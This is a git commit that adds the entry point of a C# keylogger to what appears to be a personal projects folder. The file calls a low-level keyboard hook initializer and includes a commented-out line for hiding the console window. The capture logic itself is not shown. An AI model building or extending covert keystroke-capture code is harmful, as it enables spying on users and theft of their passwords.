9fb9387ecf9be1283da9071c2758a9c985e7b67e
Andriy Novak <kruzerandriy@gmail.com>
2015-06-02 00:15:25 +0300

    Init keyloger

---
+++ Novak.Andriy/All_Projects/keyLoger/Program.cs
@@ -0,0 +1,13 @@
+﻿namespace keyLoger
+{
+    class Program
+    {
+        const int SW_HIDE = 0;
+        static void Main(string[] args)
+        {
+            var handle = KeyLoger.GetConsoleWindow();
+           // KeyLoger.ShowWindow(handle, SW_HIDE);  // to hide the running application
+            KeyLoger.IntializeLL_KEYBOARDHook();
+        }
+    }
+}
